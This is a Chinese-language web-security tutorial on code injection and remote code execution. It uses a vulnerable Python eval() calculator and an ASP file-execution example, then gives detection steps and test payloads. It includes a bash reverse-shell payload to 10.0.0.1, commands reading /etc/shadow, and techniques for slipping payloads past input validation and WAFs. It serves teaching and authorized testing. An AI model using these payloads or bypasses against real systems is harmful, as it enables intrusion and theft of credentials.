## 编程语言代码注入

定义：用户输入作为动态代码或包含文件由服务器执行。

### python 示例

假设计算器程序接受用户输入字符串，通过`eval()`传递它，并返回结果：

```python
def calculate(input):
    return eval("{}".format(input))

result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

用户可以通过以下GET请求向计算器发送操作。当按预期运行时，以下用户输入将输出字符串`The result is 3`：

```http
GET /calculator?calc=1+2
Host: example.com
```

但既然此处的`eval()`接受用户提供的输入并将其作为Python代码执行，攻击者可以向应用程序提供更恶意的内容。攻击者尝试注入系统命令函数调用 `os.system()`：

```http
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

结果，程序将执行`eval("__import__('os').system('ls')")`并返回系统命令`ls`的结果。

攻击者进一步尝试注入系统命令的反向 shell 载荷：

```
GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
Host: example.com
```


### ASP 服务器端示例

以下 ASP 代码会将输入保存到文件，然后执行该文件：

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'用户输入 Data 被写入名为 data.txt 的文件
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'执行 data.txt
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>
```

## 编程语言代码注入到操作系统命令注入 —— 寻找RCE

与我们迄今为止介绍的大多数攻击一样，RCE有两种类型：经典型和盲型。经典RCE是指你可以在后续HTTP响应中读取代码执行结果的情况，而盲RCE是指恶意代码被执行但执行结果不显示在任何HTTP响应中的情况。虽然攻击者无法看到他们执行的结果，但盲RCE与经典RCE一样危险，因为它们可以使攻击者生成反向shell或将数据外泄到远程服务器。寻找这两种类型的RCE是类似的过程，但你确认这些漏洞所需的命令或代码片段会有所不同。

以下是一些在攻击Linux服务器时可以使用的命令。在寻找经典RCE漏洞时，验证漏洞所需的全部操作是执行像`whoami`这样的命令，该命令输出当前用户的用户名。如果响应包含Web服务器的用户名（如`www-data`），你就确认了RCE，因为命令已成功运行。另一方面，要验证盲RCE，你需要执行一个影响系统行为的命令，如`sleep 5`，它会将响应延迟五秒。然后如果你在收到响应之前经历了五秒的延迟，你就可以确认该漏洞。与我们用于利用其他漏洞的盲技术类似，你也可以设置一个监听器并尝试从目标服务器触发带外交互。

### 第1步：收集关于目标的信息

发现任何漏洞的第一步是收集关于目标的信息。在寻找RCE时，这一步尤其重要，因为实现RCE的路径极度依赖于目标的构建方式。你应该找出关于Web服务器、编程语言以及当前目标使用的其他技术的信息。

### 第2步：识别可疑的用户输入位置

与发现许多其他漏洞一样，发现RCE的下一步是识别用户可以提交输入的位置。在寻找编程语言代码注入时，注意每个直接的用户输入位置，包括URL参数、HTTP头、请求体参数和文件上传。有时应用程序会解析用户提供的文件并不安全地将其内容拼接到执行的代码中，因此任何最终传递给命令的输入都是你应该注意的。

要发现潜在的文件包含漏洞，检查用于确定文件名或路径的输入位置，以及应用程序中的任何文件上传功能。

### 第3步：提交测试载荷

接下来你应该做的是向应用程序提交测试载荷。对于编程语言代码注入漏洞，尝试旨在被服务器解释为代码的载荷，看看它们是否被执行。例如：

- Python载荷

  - 如果Python执行成功，此命令旨在打印字符串`RCE test!`：

    ```python
    print("RCE test!")
    ```

  - 此命令打印系统命令`ls`的结果：

    ```python
    "__import__('os').system('ls')"
    ```

  - 此命令将响应延迟10秒：

    ```python
    "__import__('os').system('sleep 10')"
    ```

- PHP载荷

  - 如果执行成功，此命令旨在打印本地PHP配置信息：

    ```php
    phpinfo();
    ```

  - 此命令打印系统命令`ls`的结果：

    ```php
    <?php system("ls");?>
    ```

  - 此命令将响应延迟10秒：

    ```php
    <?php system("sleep 10");?>
    ```

### 第4步：确认漏洞

最后，通过执行无害命令（如`whoami`、`ls`和`sleep 5`）来确认漏洞。

## 绕过RCE保护

许多应用程序已经意识到RCE的危险，并采用输入验证或防火墙来阻止潜在恶意请求。以下是一些基本的输入验证绕过方法

### PHP

你还可以改变在PHP中编写同一命令的方式。例如，PHP允许你将函数名作为字符串连接。你甚至可以十六进制编码函数名，或在命令中插入PHP注释而不改变其结果：

```php
/* Text surrounded by these brackets are comments in PHP. */
```

例如，假设你想在PHP中执行此系统命令：

```php
system('cat /etc/shadow');
```

以下示例通过连接字符串`sys`和`tem`来执行系统命令：

```php
('sys'.'tem')('cat /etc/shadow');
```

以下示例做同样的事情，但在命令中间插入了一个空白注释：

```php
system/**/('ls');
```

这行代码是系统命令的十六进制编码版本：

```php
'\x73\x79\x73\x74\x65\x6d'('ls');
```

### Python 

Python 中存在类似 PHP 的行为。以下在Python语法中都是等价的：

```python
__import__('os').system('cat /etc/shadow')
__import__('o'+'s').system('cat /etc/shadow')
__import__('\x6f\x73').system('cat /etc/shadow')
```

### 分散载荷到多个参数中

此外，一些服务器将具有相同名称的多个参数的值拼接成单个值。在这种情况下，你可以将恶意代码分成块以绕过输入验证。例如，如果防火墙阻止包含字符串`system`的请求，你可以将RCE载荷分成块，如下所示：

```
GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
Host: example.com
```

参数将通过防火墙而不会出现问题，因为请求在技术上不包含字符串`system`。但当服务器处理请求时，参数值将被拼接成一个形成我们的RCE载荷的字符串：`"__import__('os').system('ls')"`。

### 其他方法

对载荷进行十六进制编码、URL编码、双重URL编码，并改变大小写（大写或小写字符）。
在载荷中插入特殊字符，如空字节、换行符、转义字符（`\`）和其他特殊或非ASCII字符。然后，观察哪些载荷被阻止，哪些成功，并构造能够绕过过滤器以达到预期结果的利用。如果你对此主题感兴趣，在线搜索`RCE filter bypass`或`WAF bypass`以了解更多。此外，本节提到的原则也可用于绕过其他漏洞的输入验证，如SQL注入和XSS。
